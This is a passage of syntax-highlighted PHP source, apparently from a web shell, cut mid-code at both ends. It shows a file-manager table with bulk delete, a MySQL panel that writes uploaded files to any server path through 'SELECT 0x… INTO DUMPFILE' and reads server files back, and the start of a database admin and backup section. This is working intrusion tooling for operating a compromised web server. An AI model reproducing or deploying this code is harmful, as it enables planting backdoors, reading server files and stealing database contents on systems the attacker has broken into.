<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #66cccc; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.<span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>).<span style="color: #66cccc;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t</span><span style="color: #66cccc; text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dir_i</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' directories / '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">file_i</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">' files&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">end dir</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'sqlfile'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">doing</span>==<span style="color: #66cccc;">"mysqlupload"</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">file</span> = $<span style="color: #6699cc;">_FILES</span>[<span style="color: #66cccc;">'uploadfile'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filename</span> = $<span style="color: #ffcc66;">file</span>[<span style="color: #66cccc;">'tmp_name'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">savepath</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'The goal file has already existed'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!$<span style="color: #ffcc66;">filename</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Please choose a file'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">filename</span>,<span style="color: #66cccc;">'r'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">contents</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fread(</span>$<span style="color: #ffcc66;">fp</span>, <span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">filename</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">contents</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bin2hex(</span>$<span style="color: #ffcc66;">contents</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!$<span style="color: #ffcc66;">upname</span>) $<span style="color: #ffcc66;">upname</span> = $<span style="color: #ffcc66;">file</span>[<span style="color: #66cccc;">'name'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>,$<span style="color: #ffcc66;">charset</span>,$<span style="color: #ffcc66; text-decoration: underline;">dbport</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE </span><span style="color: #66cccc; text-decoration: underline;">'$savepath';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span>$<span style="color: #ffcc66;">result</span> ? <span style="color: #66cccc;">'Upload success'</span> : <span style="color: #66cccc;">'Upload has failed: '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">mysql_error</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="color: #cc99cc;">?&gt;</span>
<span style="color: #6699cc;">&lt;script</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"text/javascript"</span><span style="color: #6699cc;">&gt;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">mysqlfile</span>(<span style="color: #f2777a; font-weight: bold;">doing</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!<span style="color: #f2777a; font-weight: bold;">doing</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'doing'</span>).<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">doing</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #f2777a; font-weight: bold;">dbhost</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'dbinfo'</span>).<span style="color: #f2777a; font-weight: bold;">dbhost</span>.<span style="color: #f2777a; font-weight: bold;">value</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #f2777a; font-weight: bold;">dbport</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'dbinfo'</span>).<span style="color: #f2777a; font-weight: bold;">dbport</span>.<span style="color: #f2777a; font-weight: bold;">value</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #f2777a; font-weight: bold;">dbuser</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'dbinfo'</span>).<span style="color: #f2777a; font-weight: bold;">dbuser</span>.<span style="color: #f2777a; font-weight: bold;">value</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #f2777a; font-weight: bold;">dbpass</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'dbinfo'</span>).<span style="color: #f2777a; font-weight: bold;">dbpass</span>.<span style="color: #f2777a; font-weight: bold;">value</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #f2777a; font-weight: bold;">dbname</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'dbinfo'</span>).<span style="color: #f2777a; font-weight: bold;">dbname</span>.<span style="color: #f2777a; font-weight: bold;">value</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #f2777a; font-weight: bold;">charset</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'dbinfo'</span>).<span style="color: #f2777a; font-weight: bold;">charset</span>.<span style="color: #f2777a; font-weight: bold;">value</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'mysqlfile'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #6699cc;">&lt;/script&gt;</span>
<span style="color: #cc99cc;">&lt;?php</span>
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dbhost</span> &amp;&amp; $<span style="color: #ffcc66;">dbhost</span> = <span style="color: #66cccc;">'localhost'</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dbuser</span> &amp;&amp; $<span style="color: #ffcc66;">dbuser</span> = <span style="color: #66cccc;">'root'</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dbport</span> &amp;&amp; $<span style="color: #ffcc66;">dbport</span> = <span style="color: #66cccc;">'3306'</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=<span style="color: #6699cc;">&gt;</span><span style="color: #66cccc;">'MYSQL Information'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbinfo'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'sqlfile'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBHost:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbhost'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">20</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbhost</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">':'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbport'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">4</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbport</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBUser:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbuser'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">15</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbuser</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBPass:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbpass'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">15</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbpass</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBName:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbname'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">15</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbname</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBCharset:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeselect(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'charset'</span>,<span style="color: #66cccc;">'option'</span>=&gt;$<span style="color: #ffcc66;">charsetdb</span>,<span style="color: #66cccc;">'selected'</span>=&gt;$<span style="color: #ffcc66;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="POST" enctype="multipart/form-data" name</span><span style="color: #66cccc; text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty</span><span style="color: #66cccc; text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /</span><span style="color: #66cccc; text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dbhost'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dbport'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dbuser'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dbpass'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dbname'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'charset'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'doing'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'sqlfile'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/form&gt;'</span>);
}

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'mysqladmin'</span>) {
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dbhost</span> &amp;&amp; $<span style="color: #ffcc66;">dbhost</span> = <span style="color: #66cccc;">'localhost'</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dbuser</span> &amp;&amp; $<span style="color: #ffcc66;">dbuser</span> = <span style="color: #66cccc;">'root'</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dbport</span> &amp;&amp; $<span style="color: #ffcc66;">dbport</span> = <span style="color: #66cccc;">'3306'</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> = <span style="color: #66cccc;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbhost</span>)){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> .= <span style="color: #66cccc;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\</span><span style="color: #66cccc; text-decoration: underline;">"$dbhost\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbuser</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> .= <span style="color: #66cccc;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\</span><span style="color: #66cccc; text-decoration: underline;">"$dbuser\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbpass</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> .= <span style="color: #66cccc;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\</span><span style="color: #66cccc; text-decoration: underline;">"$dbpass\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbport</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> .= <span style="color: #66cccc;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\</span><span style="color: #66cccc; text-decoration: underline;">"$dbport\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbname</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> .= <span style="color: #66cccc;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\</span><span style="color: #66cccc; text-decoration: underline;">"$dbname\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">charset</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbform</span> .= <span style="color: #66cccc;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value</span><span style="color: #66cccc; text-decoration: underline;">=\"$charset\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'backupmysql'</span> &amp;&amp; $<span style="color: #ffcc66;">saveasfile</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">table</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Please choose the table'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>,$<span style="color: #ffcc66;">charset</span>,$<span style="color: #ffcc66;">dbpo</span><span style="color: #ffcc66; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">path</span>,<span style="color: #66cccc;">'w'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">fp</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">table</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">k</span> =&gt; $<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">sqldumptable(</span>$<span style="color: #ffcc66;">v</span>, $<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);<span style="color: #f2777a; background-color: #515151;">                </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fileurl</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #f2777a; font-weight: bold;">SA_ROOT</span>,<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">path</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Database has success backup to &lt;a href="'</span>.$<span style="color: #ffcc66;">fileurl</span>.<span style="color: #66cccc;">'" target=</span><span style="color: #66cccc; text-decoration: underline;">"_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">path</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">mysql_close(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Backup failed'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">insert</span> &amp;&amp; $<span style="color: #ffcc66;">insertsql</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">keystr</span> = $<span style="color: #ffcc66;">valstr</span> = $<span style="color: #ffcc66;">tmp</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">insertsql</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span> =&gt; $<span style="color: #ffcc66;">val</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">val</span>) {
